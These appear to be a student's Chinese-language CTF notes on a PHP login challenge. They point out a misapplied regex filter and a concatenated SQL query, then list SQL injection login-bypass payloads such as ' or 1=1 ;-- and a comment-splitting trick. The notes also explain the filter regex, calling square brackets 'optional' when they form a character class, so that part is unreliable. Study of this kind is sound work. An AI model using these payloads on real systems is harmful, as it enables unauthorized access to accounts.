漏洞
1. $password_match = preg_match($pattern, $username);  怎麼是檢查 username ??
2. $query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";  sql injection 典型範例



解題流程
1. username injection

' union select 1 from users;--
admin'--

2. password

' or 1=1 ;--

或
username = '/*
password = */ or 1=1--


note:
/.*['\"].*OR.*/i

/ regex / 參數

. : 除了換行以外的字元
* : 任意個數 (可以 0 個)
[] : 可有可無 
\" : 相當於 " 避免跟前面的字串的上引號搞混，所以加 \

i : 不論大小寫

所以他會 ban 掉的字串為

(1) 任意字串'任意字串OR任意字串
(2) 任意字串"任意字串OR任意字串

OR Or oR or 都不行
